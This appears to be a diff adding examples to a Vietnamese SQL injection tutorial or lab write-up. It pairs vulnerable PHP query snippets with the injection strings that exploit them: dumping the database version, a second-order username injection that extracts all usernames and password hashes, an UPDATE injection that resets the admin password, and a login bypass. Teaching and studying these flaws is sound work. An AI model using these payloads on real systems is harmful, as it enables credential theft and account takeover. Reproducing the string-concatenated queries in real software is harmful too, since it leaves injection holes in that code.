@@ -79,6 +79,40 @@ C1: Truyền dữ liệu vào biến username: `' UNION SELECT password, md5('1'
 
 C2: Cách này sẽ thao túng luôn password và đăng nhập với tư cách admin với bất kì password nào. `' UNION SELECT 'admin', md5('1') -- `.
 
+### Example 6
+
+```
+$sql = "SELECT content FROM posts WHERE id=$id";
+```
+
+Khai thác truy vấn database version: `0 UNION SELECT @@version –- `.
+
+### Example 7
+
+```
+$sql = "SELECT username FROM users WHERE username=? and password=?";
+$statement = $database->prepare($sql);
+$statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
+$statement->execute();
+$statement->store_result();
+$statement->bind_result($result);
+
+if ($statement->num_rows > 0) {
+    $statement->fetch();
+    $_SESSION["username"] = $result;
+    die(header("Location: profile.php"));
+
+...
+```
+Ở ex này câu truy vấn sử dụng "prepared statements" giúp chống lại các cuộc tấn công SQL injection. Nhưng tại file profile.php lại sử dụng câu truy vấn nối chuỗi `$sql = "SELECT email FROM users WHERE username='$username'";` dẫn đến bị khai thác:
+
+Tạo tài khoản với username: `' UNION SELECT GROUP_CONCAT(username, password) FROM users -- `.
+
+### Level 8
+```
+$sql = "UPDATE users SET email='$email' WHERE username='$username'";
+```
+Cách khai thác: lợi dụng câu truy vấn UPDATE thay đổi password của `admin` theo ý muốn `', password = md5('1') where username='admin' --  `.
 
 
 
